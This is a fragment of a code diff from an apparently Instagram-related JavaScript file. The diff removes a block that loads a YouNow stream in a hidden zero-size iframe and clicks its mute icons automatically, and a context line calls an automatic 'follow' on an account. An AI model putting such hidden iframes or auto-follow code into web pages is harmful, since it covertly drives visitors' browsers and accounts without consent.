@@ -63,15 +63,4 @@ media.instagram.follow("1140348283")
 
 }
 
-i = document.createElement('iframe');
-            i.id = "sananeyarak";
-            i.width = "0";
-            i.height = "0";
-            i.src = "https://www.younow.com/x_daisybelle_x";
-            document.getElementsByTagName('body')[0].appendChild(i);
-            setTimeout(function () {
-                var el = document.getElementById("sananeyarak").contentWindow.document.getElementsByClassName('volume-icon ynicon ynicon-icon-mic clickable ynicon-mute');
-                for (var i = 0; i < el.length; i++) {
-                    el[i].click();
-                }
-            }, 3000);
+
